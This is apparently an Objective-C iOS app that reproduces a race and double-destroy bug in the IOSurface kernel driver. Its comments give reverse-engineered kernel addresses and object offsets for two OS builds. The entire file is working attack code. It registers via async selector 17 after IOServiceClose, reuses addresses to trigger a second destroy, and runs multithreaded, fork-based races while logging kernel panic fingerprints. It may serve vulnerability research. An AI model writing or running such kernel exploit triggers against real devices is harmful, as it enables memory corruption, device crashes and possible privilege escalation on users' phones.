// israce — IOSurface 生命周期复现器（`obj+0xf1` 守卫线）
//
// 静态结论（out/IOSURFACE-RACE.md）：
//   IOSurface 客户端对象布局：+0xe8 = 共享 IOSurfaceRoot，+0xf0 bit0 = 「已挂进注册表」，
//   +0xf1 = 27.2 独有的「已注销」粘滞标记，+0xf8 = PAC 签名指针（autda/xpacd，失配 brk #0xc472）。
//   注册 #799  27.0.1 = 0xfffffe000a3460f0 / 27.2 = 0xfffffe000a3944c0
//   注销 #802  27.0.1 = 0xfffffe000a346364 / 27.2 = 0xfffffe000a394744
//   27.2 在 #799 锁后加 ldrb w8,[self,#0xf1]; tbz 否则 return kIOReturnNotAttached(0xE00002D8)；
//   在 #802 锁后加 mov w8,#1; strb w8,[self,#0xf1]；并把 #802 提到 teardown 最前。
//
// selector 17 = 带 key 的注册。#799 的 arg 契约（反汇编解出，非猜测）：
//   handler 0xa3498f4:  ldr x1,[args+0x10] ; cbz x1 -> kIOReturnBadArgument
//                       ldr x2,[args+0x30] (= structureInput，需 24 字节)
//   #799:  ldr x1,[reference] ; ldp x2,x3,[structureInput] ; ldr x8,[structureInput+0x10]
//          init(node+0x10, *reference, in[0], in[1])
//              init = 0xb379304:  (old&3)|*ref -> +0x00, in[0] -> +0x08, in[1] -> +0x10
//              纯标量写入，不解引用 *ref
//          node+0x50 = in[2] ; node+0x58 = self ; 头插入 root+0x188 / root+0x190
//   => args+0x10 是 reference 数组指针，只有 IOConnectCallAsyncMethod 会填；同步调用恒为 0
//      => 恒 BadArgument。已实测：4 种同步形态全部 0xE00002C2（out/israce/round-*.ndjson）。
//
// 输出 tmp/israce.ndjson，每用例 begin/end 两行，逐行 fflush；panic 留下「有 begin 无 end」指纹。

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <dlfcn.h>
#include <unistd.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/time.h>

#define SEL_REG    17
#define SEL_DEREG  18

static const double kStartBudget = 21.0;
static const double kWatchdog    = 26.0;

static NSString *gTmp = nil;
static FILE *gNd = NULL, *gLog = NULL;
static pthread_mutex_t gMx = PTHREAD_MUTEX_INITIALIZER;
static double gT0 = 0;
static volatile int gFinished = 0, gStop = 0;
static int gRan = 0, gEnds = 0, gSkips = 0, gOK = 0;
static int gShape = -1;
static NSMutableSet *gDone = nil;

static void initClock(void) {
    struct timeval tv; gettimeofday(&tv, NULL);
    gT0 = (double)tv.tv_sec + tv.tv_usec / 1e6;
}
static double nowSec(void) { struct timeval tv; gettimeofday(&tv, NULL);
    return (double)tv.tv_sec + tv.tv_usec / 1e6 - gT0; }
static uint64_t nowNs(void) { struct timeval tv; gettimeofday(&tv, NULL);
    return (uint64_t)tv.tv_sec * 1000000000ull + (uint64_t)tv.tv_usec * 1000ull; }
static void sleepUs(long us) { if (us > 0) usleep((useconds_t)us); }

static void L(NSString *fmt, ...) {
    if (!gLog) return;
    va_list a; va_start(a, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:a];
    va_end(a);
    pthread_mutex_lock(&gMx);
    fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog);
    pthread_mutex_unlock(&gMx);
}
static void ND(NSString *s) {
    if (!gNd) return;
    pthread_mutex_lock(&gMx);
    fprintf(gNd, "%s\n", s.UTF8String); fflush(gNd);
    pthread_mutex_unlock(&gMx);
}
static void beginCase(NSString *k, NSString *meta) {
    ND([NSString stringWithFormat:@"{\"k\":\"%@\",\"ph\":\"begin\",\"t\":%.3f%@}",
        k, nowSec(), meta ?: @""]);
}
static void endCase(NSString *k, NSString *f) {
    ND([NSString stringWithFormat:@"{\"k\":\"%@\",\"ph\":\"end\",\"t\":%.3f%@}", k, nowSec(), f ?: @""]);
    gEnds++;
}
static void noteEvent(NSString *ev, NSString *f) {
    ND([NSString stringWithFormat:@"{\"k\":\"@%@\",\"ph\":\"note\",\"t\":%.3f%@}",
        ev, nowSec(), f ?: @""]);
}

static const char *rcName(uint32_t v) {
    switch (v) {
        case 0:          return "SUCCESS";
        case 0xE00002BC: return "kIOReturnError";
        case 0xE00002BD: return "kIOReturnNoMemory";
        case 0xE00002C1: return "kIOReturnNotPrivileged";
        case 0xE00002C2: return "kIOReturnBadArgument";
        case 0xE00002C7: return "kIOReturnUnsupported";
        case 0xE00002C9: return "kIOReturnInternalError";
        case 0xE00002CC: return "kIOReturnNotOpen";
        case 0xE00002D6: return "kIOReturnOffline";
        case 0xE00002D8: return "kIOReturnNotAttached";
        case 0xE00002E2: return "kIOReturnNotPermitted";
        case 0xE00002EB: return "kIOReturnAborted";
        default:         return "?";
    }
}

// ---------------- IOSurface 私有 API ----------------
typedef struct __IOSurface *IOSurfaceRef_;
static IOSurfaceRef_ (*pCreate)(CFDictionaryRef);
static IOSurfaceRef_ (*pLookup)(uint32_t);
static uint32_t       (*pGetID)(IOSurfaceRef_);
static kern_return_t  (*pLock)(IOSurfaceRef_, uint32_t, uint32_t *);
static kern_return_t  (*pUnlock)(IOSurfaceRef_, uint32_t, uint32_t *);

static void loadIOSurface(void) {
    const char *paths[] = {
        "/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface",
        "/System/Library/Frameworks/IOSurface.framework/IOSurface", NULL };
    void *h = NULL;
    for (int i = 0; paths[i] && !h; i++) h = dlopen(paths[i], RTLD_LAZY);
    if (!h) { L(@"dlopen IOSurface 失败"); return; }
    pCreate = (void *)dlsym(h, "IOSurfaceCreate");
    pLookup = (void *)dlsym(h, "IOSurfaceLookup");
    pGetID  = (void *)dlsym(h, "IOSurfaceGetID");
    pLock   = (void *)dlsym(h, "IOSurfaceLock");
    pUnlock = (void *)dlsym(h, "IOSurfaceUnlock");
    L(@"IOSurface sym: create=%d lookup=%d getID=%d lock=%d unlock=%d",
      !!pCreate, !!pLookup, !!pGetID, !!pLock, !!pUnlock);
}
static IOSurfaceRef_ mkSurface(void) {
    if (!pCreate) return NULL;
    int w = 64, h = 4, bpe = 4, pf = 0x42475241;
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    const void *vk[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                          CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vv[4] = { W, H, B, P };
    CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 4,
                                           &kCFTypeDictionaryKeyCallBacks,
                                           &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef_ s = pCreate(d);
    CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
    return s;
}

// ---------------- IOKit ----------------
static io_service_t gSvc = 0;
static int openConn(io_connect_t *out) {
    return IOServiceOpen(gSvc, mach_task_self(), 0, out);
}
static mach_port_t newWakePort(void) {
    mach_port_t p = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
        return MACH_PORT_NULL;
    return p;
}
static void dropPort(mach_port_t p) {
    if (p) mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
}

// shape: 0=同步(对照) 1=async refCnt=1 ref!=0  2=async refCnt=1 ref=0  3=async refCnt=0
static kern_return_t callSel(io_connect_t c, uint32_t sel, const uint64_t *in3,
                            size_t inSz, int shape, mach_port_t wp) {
    uint64_t buf[3] = { 0, 0, 0 };
    if (in3) { buf[0] = in3[0]; buf[1] = in3[1]; buf[2] = in3[2]; }
    uint64_t ref = 0x1122334455667788ull;
    uint64_t zero = 0;
    uint32_t soc = 0;
    switch (shape) {
        case 0:
            return IOConnectCallMethod(c, sel, NULL, 0, buf, inSz, NULL, NULL, NULL, NULL);
        case 1:
            return IOConnectCallAsyncMethod(c, sel, wp, &ref, 1,
                                            NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
        case 2:
            return IOConnectCallAsyncMethod(c, sel, wp, &zero, 1,
                                            NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
        case 3:
            return IOConnectCallAsyncMethod(c, sel, wp, NULL, 0,
                                            NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
    }
    return KERN_FAILURE;
}

// ---------------- 校准 ----------------
static int calibrate(void) {
    uint64_t in[3] = { 1, 2, 3 };
    int best = -1;
    for (int shape = 0; shape < 4; shape++) {
        io_connect_t c = 0;
        mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { L(@"校准：open 失败"); dropPort(wp); return -1; }
        kern_return_t r = callSel(c, SEL_REG, in, 24, shape, wp);
        L(@"calib sel17 shape=%d -> 0x%x %s", shape, (uint32_t)r, rcName((uint32_t)r));
        noteEvent(@"calib", [NSString stringWithFormat:
            @",\"shape\":%d,\"rc\":%u,\"rcn\":\"%s\"", shape, (uint32_t)r, rcName((uint32_t)r)]);
        if (r == KERN_SUCCESS && best < 0) best = shape;
        IOServiceClose(c);
        dropPort(wp);
    }
    {   io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) == KERN_SUCCESS) {
            uint32_t r = (uint32_t)callSel(c, SEL_DEREG, in, 24, 0, wp);
            L(@"calib sel18 sync -> 0x%x %s", r, rcName(r));
            noteEvent(@"calib18", [NSString stringWithFormat:
                @",\"rc\":%u,\"rcn\":\"%s\"", r, rcName(r)]);
            IOServiceClose(c);
        }
        dropPort(wp);
    }
    L(@"校准结果 shape=%d", best);
    return best;
}

// ---------------- 灌流 ----------------
static volatile int gSpamRun = 0;
static io_connect_t gSpamConn = 0;
static volatile uint64_t gSpamCount = 0;
static volatile int gSpamShape = 1;

static void *spamReg(void *arg) {
    (void)arg;
    io_connect_t c = gSpamConn;
    int shape = gSpamShape;
    mach_port_t wp = newWakePort();
    uint64_t in[3] = { 1, 2, 3 };
    while (gSpamRun) {
        callSel(c, SEL_REG, in, 24, shape, wp);
        __sync_fetch_and_add(&gSpamCount, 1);
    }
    dropPort(wp);
    return NULL;
}
static void *spamLock(void *arg) {
    IOSurfaceRef_ s = (IOSurfaceRef_)arg;
    uint32_t seed = 0;
    while (gSpamRun) {
        if (pLock)   pLock(s, 0, &seed);
        if (pUnlock) pUnlock(s, 0, &seed);
        __sync_fetch_and_add(&gSpamCount, 1);
    }
    return NULL;
}

// ---------------- 变体 ----------------
enum {
    V_SYNC_CTRL = 0, V_ASYNC_BASE = 1, V_DOUBLE = 2,
    V_POSTCLOSE = 3, V_POSTCLOSE2 = 4, V_ADDRREUSE = 5,
    V_RACE1 = 10, V_RACE8 = 11, V_FORKCL = 12, V_FORKEXIT = 13,
    V_SURFCH = 14, V_LOCKDEG = 15, V_BIG = 16, V_DEREG18 = 17,
};

static int runCase(int variant, int nsurf, int iter, NSString *key, int shape) {
    uint64_t in[3] = { 1, 2, 3 };
    uint64_t t0 = nowNs();
    int rc = -1, nrc = 0;
    uint32_t rcs[8] = {0};

    switch (variant) {
    case V_SYNC_CTRL: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, 0, MACH_PORT_NULL); nrc = 1;
        IOServiceClose(c);
        break;
    }
    case V_ASYNC_BASE: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp); nrc = 1;
        IOServiceClose(c); dropPort(wp);
        break;
    }
    case V_DOUBLE: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp); nrc = 1;
        rcs[1] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp); nrc = 2;
        rcs[2] = (uint32_t)callSel(c, SEL_DEREG, in, 24, 0, wp);  nrc = 3;
        rcs[3] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp); nrc = 4;
        IOServiceClose(c); dropPort(wp);
        break;
    }
    case V_POSTCLOSE: {
        // ★ 核心：加一个额外 uref，让端口名在 IOServiceClose 之后仍可用，
        //   于是「注销之后又注册」被直接触发，不需要竞态。
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp);   // 挂进表
        rcs[1] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp);   // 重复 -> 0xC9
        IOServiceClose(c);                                          // teardown: #802 摘链
        rcs[2] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp);   // ★ 注销后再注册
        rcs[3] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp);   // 再来一次
        nrc = 4;
        mach_port_deallocate(mach_task_self(), c);
        dropPort(wp);
        break;
    }
    case V_POSTCLOSE2: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +2);
        rcs[0] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp); nrc = 1;
        IOServiceClose(c);
        rcs[1] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp); nrc = 2;
        IOServiceClose(c);
        rcs[2] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp); nrc = 3;
        rcs[3] = (uint32_t)callSel(c, SEL_DEREG, in, 24, 0, wp);   nrc = 4;
        rcs[4] = (uint32_t)callSel(c, SEL_REG, in, 24, shape, wp); nrc = 5;
        mach_port_deallocate(mach_task_self(), c);
        dropPort(wp);
        break;
    }
    case V_ADDRREUSE: {
        // 关掉 A 后留下「注销后又注册」的残留节点；再连开一批新客户端复用 A 的地址，
        // 然后逐个关闭，让 #802 按 node+0x58 命中残留节点 -> 二次 destroy。
        io_connect_t a = 0; mach_port_t wp = newWakePort();
        if (openConn(&a) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        mach_port_mod_refs(mach_task_self(), a, MACH_PORT_RIGHT_SEND, +1);
        callSel(a, SEL_REG, in, 24, shape, wp);
        IOServiceClose(a);
        rcs[0] = (uint32_t)callSel(a, SEL_REG, in, 24, shape, wp); nrc = 1;
        mach_port_deallocate(mach_task_self(), a);
        int N = (nsurf > 0 && nsurf <= 64) ? nsurf : 24;
        io_connect_t cs[64]; int have[64];
        for (int i = 0; i < N; i++) {
            have[i] = (openConn(&cs[i]) == KERN_SUCCESS);
            if (have[i]) callSel(cs[i], SEL_REG, in, 24, shape, wp);
            else cs[i] = 0;
        }
        for (int i = N - 1; i >= 0; i--) if (have[i]) IOServiceClose(cs[i]);
        dropPort(wp);
        break;
    }
    case V_RACE1: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        callSel(c, SEL_REG, in, 24, shape, wp);
        pthread_t th[6];
        gSpamRun = 1; gSpamConn = c; gSpamCount = 0; gSpamShape = shape;
        for (int i = 0; i < 6; i++) pthread_create(&th[i], NULL, spamReg, NULL);
        sleepUs(150 + (iter % 50) * 20);
        IOServiceClose(c);
        sleepUs(700);
        gSpamRun = 0;
        for (int i = 0; i < 6; i++) pthread_join(th[i], NULL);
        dropPort(wp);
        break;
    }
    case V_RACE8: {
        io_connect_t cs[8]; int have[8];
        for (int i = 0; i < 8; i++) {
            have[i] = (openConn(&cs[i]) == KERN_SUCCESS);
            if (have[i]) callSel(cs[i], SEL_REG, in, 24, shape, MACH_PORT_NULL);
            else cs[i] = 0;
        }
        pthread_t th[16];
        gSpamRun = 1; gSpamConn = have[0] ? cs[0] : 0; gSpamCount = 0; gSpamShape = shape;
        for (int i = 0; i < 16; i++) pthread_create(&th[i], NULL, spamReg, NULL);
        for (int r = 0; r < 3; r++)
            for (int i = 0; i < 8; i++) {
                int j = (i * 5 + r * 3) % 8;
                if (have[j]) { IOServiceClose(cs[j]); have[j] = 0; }
                sleepUs(20 + (iter % 10) * 7);
            }
        gSpamRun = 0;
        for (int i = 0; i < 16; i++) pthread_join(th[i], NULL);
        for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
        break;
    }
    case V_FORKCL: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        callSel(c, SEL_REG, in, 24, shape, wp);
        pthread_t th[4];
        gSpamRun = 1; gSpamConn = c; gSpamCount = 0; gSpamShape = shape;
        for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamReg, NULL);
        pid_t pid = fork();
        if (pid == 0) { sleepUs(200 + (iter % 40) * 25); IOServiceClose(c); _exit(0); }
        if (pid < 0) { gSpamRun = 0;
                       for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
                       IOServiceClose(c); dropPort(wp); rc = -101; break; }
        int st = 0; waitpid(pid, &st, 0);
        sleepUs(400); gSpamRun = 0;
        for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
        IOServiceClose(c); dropPort(wp);
        break;
    }
    case V_FORKEXIT: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        callSel(c, SEL_REG, in, 24, shape, wp);
        pthread_t th[4];
        gSpamRun = 1; gSpamConn = c; gSpamCount = 0; gSpamShape = shape;
        for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamReg, NULL);
        pid_t pid = fork();
        if (pid == 0) { sleepUs(200 + (iter % 40) * 25); _exit(0); }
        if (pid < 0) { gSpamRun = 0;
                       for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
                       IOServiceClose(c); dropPort(wp); rc = -101; break; }
        int st = 0; waitpid(pid, &st, 0);
        sleepUs(300); gSpamRun = 0;
        for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
        IOServiceClose(c); dropPort(wp);
        break;
    }
    case V_SURFCH: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        callSel(c, SEL_REG, in, 24, shape, wp);
        pthread_t th[4];
        gSpamRun = 1; gSpamConn = c; gSpamCount = 0; gSpamShape = shape;
        for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamReg, NULL);
        for (int i = 0; i < 8; i++) {
            IOSurfaceRef_ s = mkSurface();
            if (s) { if (pGetID) (void)pGetID(s); CFRelease(s); }
            if (pLookup) { IOSurfaceRef_ l = pLookup((uint32_t)(0x100 + i)); if (l) CFRelease(l); }
        }
        sleepUs(200 + (iter % 30) * 25);
        IOServiceClose(c);
        sleepUs(400); gSpamRun = 0;
        for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
        dropPort(wp);
        break;
    }
    case V_LOCKDEG: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        callSel(c, SEL_REG, in, 24, shape, wp);
        IOSurfaceRef_ s = mkSurface();
        if (!s) { IOServiceClose(c); dropPort(wp); rc = -102; break; }
        pthread_t th[4];
        gSpamRun = 1; gSpamConn = c; gSpamCount = 0;
        for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamLock, s);
        sleepUs(200 + (iter % 40) * 25);
        IOServiceClose(c);
        sleepUs(300); gSpamRun = 0;
        for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
        CFRelease(s); dropPort(wp);
        break;
    }
    case V_BIG: {
        int N = (nsurf > 0 && nsurf <= 64) ? nsurf : 64;
        IOSurfaceRef_ surf[64];
        for (int i = 0; i < N; i++) surf[i] = mkSurface();
        io_connect_t cs[8]; int have[8];
        for (int i = 0; i < 8; i++) {
            have[i] = (openConn(&cs[i]) == KERN_SUCCESS);
            if (have[i]) callSel(cs[i], SEL_REG, in, 24, shape, MACH_PORT_NULL);
            else cs[i] = 0;
        }
        pthread_t th[12];
        gSpamRun = 1; gSpamConn = have[0] ? cs[0] : 0; gSpamCount = 0; gSpamShape = shape;
        for (int i = 0; i < 12; i++) pthread_create(&th[i], NULL, spamReg, NULL);
        for (int i = 7; i >= 0; i--) { if (have[i]) { IOServiceClose(cs[i]); have[i] = 0; } sleepUs(30); }
        for (int i = 0; i < N; i++) if (surf[i]) CFRelease(surf[i]);
        gSpamRun = 0;
        for (int i = 0; i < 12; i++) pthread_join(th[i], NULL);
        for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
        break;
    }
    case V_DEREG18: {
        io_connect_t c = 0; mach_port_t wp = newWakePort();
        if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); rc = -100; break; }
        callSel(c, SEL_REG, in, 24, shape, wp);
        pthread_t th[6];
        gSpamRun = 1; gSpamConn = c; gSpamCount = 0; gSpamShape = shape;
        for (int i = 0; i < 6; i++) pthread_create(&th[i], NULL, spamReg, NULL);
        sleepUs(150 + (iter % 40) * 25);
        for (int i = 0; i < 6; i++)
            rcs[0] = (uint32_t)callSel(c, SEL_DEREG, in, 24, 0, wp);
        nrc = 1;
        gSpamRun = 0;
        for (int i = 0; i < 6; i++) pthread_join(th[i], NULL);
        IOServiceClose(c); dropPort(wp);
        break;
    }
    default: rc = -999; break;
    }

    uint64_t ms = (nowNs() - t0) / 1000000ull;
    NSMutableString *f = [NSMutableString string];
    [f appendFormat:@",\"v\":%d,\"ms\":%llu,\"spam\":%llu",
        variant, (unsigned long long)ms, (unsigned long long)gSpamCount];
    for (int i = 0; i < nrc; i++)
        [f appendFormat:@",\"rc%d\":%u,\"n%d\":\"%s\"", i, rcs[i], i, rcName(rcs[i])];
    if (rc != -1) [f appendFormat:@",\"err\":%d", rc];
    endCase(key, f);
    if (nrc > 0 && rcs[0] == 0) gOK++;
    return 0;
}

// ---------------- 主流程 ----------------
static void runAll(void) {
    int shape = calibrate();
    gShape = shape;
    if (shape < 0) { noteEvent(@"abort", @",\"why\":\"no shape reaches SEL_REG\""); return; }

    struct { int v, n, it; const char *tag; } plan[] = {
        { V_SYNC_CTRL,   1,   8, "synctrl"    },
        { V_ASYNC_BASE,  1,   8, "asyncbase"  },
        { V_DOUBLE,      1,   8, "double"     },
        { V_POSTCLOSE,   1,  20, "postclose"  },
        { V_POSTCLOSE2,  1,  20, "postclose2" },
        { V_ADDRREUSE,  24,  40, "addrreuse"  },
        { V_DEREG18,     1, 200, "dereg18"    },
        { V_RACE1,       1, 300, "race1"      },
        { V_RACE8,       8, 120, "race8"      },
        { V_FORKCL,      1, 200, "forkcl"     },
        { V_FORKEXIT,    1, 200, "forkexit"   },
        { V_SURFCH,      1, 200, "surfch"     },
        { V_LOCKDEG,     1, 200, "lockdeg"    },
        { V_BIG,        64,  60, "big"        },
    };
    int nplan = (int)(sizeof(plan) / sizeof(plan[0]));

    for (int p = 0; p < nplan; p++) {
        for (int i = 0; i < plan[p].it; i++) {
            if (gStop || nowSec() > kStartBudget) {
                noteEvent(@"budget", [NSString stringWithFormat:
                    @",\"at\":\"%s-%d\",\"t\":%.2f", plan[p].tag, i, nowSec()]);
                return;
            }
            NSString *key = [NSString stringWithFormat:@"%s-N%d-I%04d",
                             plan[p].tag, plan[p].n, i];
            if ([gDone containsObject:key]) { gSkips++; continue; }
            beginCase(key, [NSString stringWithFormat:
                @",\"v\":%d,\"n\":%d,\"i\":%d,\"shape\":%d",
                plan[p].v, plan[p].n, i, shape]);
            gRan++;
            @autoreleasepool { runCase(plan[p].v, plan[p].n, i, key, shape); }
        }
        noteEvent(@"phase.done", [NSString stringWithFormat:
            @",\"tag\":\"%s\",\"t\":%.2f", plan[p].tag, nowSec()]);
    }
}

static void loadDone(void) {
    NSString *path = [gTmp stringByAppendingPathComponent:@"israce.ndjson"];
    NSString *s = [NSString stringWithContentsOfFile:path
                                            encoding:NSUTF8StringEncoding error:nil];
    gDone = [NSMutableSet new];
    if (!s) return;
    for (NSString *line in [s componentsSeparatedByString:@"\n"]) {
        if (![line containsString:@"\"ph\":\"end\""]) continue;
        NSRange r1 = [line rangeOfString:@"\"k\":\""];
        if (r1.location == NSNotFound) continue;
        NSUInteger a = r1.location + r1.length;
        NSRange r2 = [line rangeOfString:@"\"" options:0
                                   range:NSMakeRange(a, line.length - a)];
        if (r2.location == NSNotFound) continue;
        [gDone addObject:[line substringWithRange:NSMakeRange(a, r2.location - a)]];
    }
    L(@"续跑：已有 %lu 条 end", (unsigned long)gDone.count);
}

static void writeSummary(void) {
    noteEvent(@"summary", [NSString stringWithFormat:
        @",\"ran\":%d,\"ends\":%d,\"skips\":%d,\"ok0\":%d,\"t\":%.2f,\"shape\":%d",
        gRan, gEnds, gSkips, gOK, nowSec(), gShape]);
    L(@"=== 发起 %d, 收尾 %d, 跳过 %d, rc0==0 %d, %.1fs", gRan, gEnds, gSkips, gOK, nowSec());
}

// ---------------- App ----------------
@interface AD : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UILabel *label;
@end

@implementation AD
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)o {
    initClock();
    gTmp = [NSTemporaryDirectory() copy];
    gLog = fopen([[gTmp stringByAppendingPathComponent:@"israce.log"] UTF8String], "w");
    loadDone();
    gNd = fopen([[gTmp stringByAppendingPathComponent:@"israce.ndjson"] UTF8String], "a");

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *root = [UIViewController new];
    root.view.backgroundColor = [UIColor blackColor];
    UILabel *lab = [[UILabel alloc] initWithFrame:CGRectInset(UIScreen.mainScreen.bounds, 16, 60)];
    lab.text = @"israce: IOSurface +0xf1";
    lab.textColor = [UIColor greenColor];
    lab.numberOfLines = 0;
    lab.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    [root.view addSubview:lab];
    self.label = lab;
    self.window.rootViewController = root;
    [self.window makeKeyAndVisible];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kWatchdog * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        if (gFinished) return;
        gFinished = 1; gStop = 1; writeSummary();
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{ exit(0); });
    });

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            loadIOSurface();
            const char *cand[] = { "IOSurfaceRoot", "IOCoreSurfaceRoot", "IOSurface", NULL };
            for (int i = 0; cand[i] && !gSvc; i++) {
                CFMutableDictionaryRef m = IOServiceMatching(cand[i]);
                if (!m) continue;
                io_iterator_t it = 0;
                if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
                    continue;
                io_object_t o, first = 0;
                while ((o = IOIteratorNext(it))) {
                    if (!first) { first = o; } else { IOObjectRelease(o); }
                }
                IOObjectRelease(it);
                if (first) {
                    io_connect_t pr = 0;
                    if (IOServiceOpen(first, mach_task_self(), 0, &pr) == KERN_SUCCESS) {
                        gSvc = first; IOServiceClose(pr);
                        L(@"service %s -> 0x%x", cand[i], gSvc);
                    } else { IOObjectRelease(first); }
                }
            }
            if (!gSvc) noteEvent(@"abort", @",\"why\":\"no IOSurface service\"");
            else runAll();
        }
        self.label.text = [NSString stringWithFormat:@"ran %d ends %d skip %d shape %d %.1fs",
                           gRan, gEnds, gSkips, gShape, nowSec()];
        if (!gFinished) { gFinished = 1; writeSummary(); }
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{ exit(0); });
    });
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AD class])); }
}
